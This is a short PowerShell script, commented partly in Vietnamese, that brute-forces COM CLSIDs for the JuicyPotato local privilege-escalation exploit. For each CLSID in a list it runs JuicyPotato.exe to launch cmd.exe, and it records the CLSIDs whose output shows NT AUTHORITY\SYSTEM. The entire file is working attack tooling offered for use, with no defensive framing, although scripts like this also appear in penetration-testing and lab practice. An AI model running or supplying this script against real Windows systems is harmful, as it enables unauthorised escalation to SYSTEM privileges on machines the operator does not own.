# File: brute_juicypotato.ps1
$clsids = Get-Content ".\clsid_list.txt"
$JuicyPotato = ".\JuicyPotato.exe"  # đổi tên nếu khác

if (Test-Path ".\working_clsid.txt") { Remove-Item ".\working_clsid.txt" }

foreach ($clsid in $clsids) {
    Write-Host "Testing CLSID: $clsid"
    try {
        $result = & $JuicyPotato -t * -l 1337 -p cmd.exe -a "/c whoami" -c $clsid 2>&1
        if ($result -match "NT AUTHORITY\\SYSTEM") {
            Write-Host "SUCCESS: $clsid"
            Add-Content ".\working_clsid.txt" $clsid
        }
    } catch {
        Write-Host "Error running CLSID: $clsid"
    }
}

Write-Host "Done! Working CLSIDs saved in working_clsid.txt"
